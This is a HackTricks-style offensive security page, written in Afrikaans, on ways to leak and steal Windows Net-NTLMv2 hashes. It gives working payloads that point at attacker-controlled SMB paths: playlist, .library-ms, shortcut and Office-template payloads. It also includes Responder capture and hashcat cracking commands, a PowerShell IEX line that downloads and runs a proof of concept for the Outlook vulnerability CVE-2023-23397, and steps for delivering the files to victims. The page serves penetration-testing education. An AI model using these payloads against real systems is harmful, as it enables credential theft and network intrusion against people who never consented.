# Plekke om NTLM creds te steel

{{#include ../../banners/hacktricks-training.md}}

**Kyk na al die wonderlike idees by [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — van die aflaai van 'n microsoft word-lêer aanlyn tot die ntlm leaks bron: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md en [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player-afspeellyste (.ASX/.WAX)

As jy 'n teiken daartoe kan kry om 'n Windows Media Player-afspeellys wat jy beheer te open of te voorskou, kan jy leak Net‑NTLMv2 deur die inskrywing na 'n UNC-pad te wys. WMP sal probeer om die verwysde media oor SMB te haal en sal implisiet outentiseer.

Voorbeeld payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Versameling en kraakproses:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ingebedde .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers op 'n onveilige wyse wanneer hulle direk van binne 'n ZIP-argief geopen word. As die library-definisie na 'n afgeleë UNC-pad wys (bv. \\attacker\share), sal bloot die blaai/lanseer van die .library-ms binne die ZIP veroorsaak dat Explorer die UNC enumereer en NTLM-verifikasie na die aanvaller uitstuur. Dit lewer 'n NetNTLMv2 wat cracked offline of potentially relayed kan word.

Minimale .library-ms wat na 'n aanvaller-UNC wys
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasionele stappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostname).
- Zip dit (on Windows: Send to → Compressed (zipped) folder) en lewer die ZIP by die teiken af.
- Start ’n NTLM capture listener en wag dat die slagoffer die .library-ms van binne die ZIP oopmaak.


### Outlook kalenderherinnering klankpad (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook vir Windows het die uitgebreide MAPI-eiendom PidLidReminderFileParameter in kalenderitems verwerk. As daardie eiendom na ’n UNC-pad wys (bv. \\attacker\share\alert.wav), sou Outlook die SMB-share kontak wanneer die herinnering afgaan, leaking the user’s Net‑NTLMv2 without any click. Dit is op 14 Maart 2023 reggestel, maar dit bly steeds hoogs relevant vir legacy/ongewysigde omgewings en vir historiese voorvalrespons.

Vinnige uitbuiting met PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Aan die luisteraarkant:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Aantekeninge
- 'n slagoffer hoef slegs Outlook for Windows aan die gang te hê wanneer die herinnering afgaan.
- Die leak lewer Net‑NTLMv2 wat geskik is vir offline cracking of relay (nie pass‑the‑hash nie).


### .LNK/.URL ikoon-gebaseerde zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer toon snelkoppeling‑ikone outomaties. Onlangse navorsing het getoon dat selfs ná Microsoft se April 2025‑patch vir UNC‑ikoon‑snelkoppelingen dit steeds moontlik was om NTLM‑authentisering sonder enige klikke te aktiveer deur die snelkoppeling se target op 'n UNC‑pad te huisves en die ikoon plaaslik te hou (patch bypass toegeken CVE‑2025‑50154). Slegs die besigtiging van die gids veroorsaak dat Explorer metadata vanaf die remote target haal, wat NTLM na die aanvaller se SMB server uitstuur.

Minimale Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program-snelkoppeling payload (.lnk) deur PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Plaas die shortcut in 'n ZIP en kry die slagoffer om dit te deurblaai.
- Plaas die shortcut op 'n skryfbare share wat die slagoffer sal open.
- Kombineer dit met ander loklêers in dieselfde gids sodat Explorer die items voorskou.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office-dokumente kan na 'n eksterne template verwys. As jy die aangehegte template na 'n UNC-pad stel, sal die opening van die dokument by SMB autentiseer.

Minimale DOCX relationship-wysigings (inside word/):

1) Wysig word/settings.xml en voeg die aangehegte template-verwysing by:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Wysig word/_rels/settings.xml.rels en wys rId1337 na jou UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Herpak na .docx en lewer dit af. Begin jou SMB capture listener en wag vir die open.

Vir post-capture idees oor relaying of abusing NTLM, kyk:

{{#ref}}
README.md
{{#endref}}


## Verwysings
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
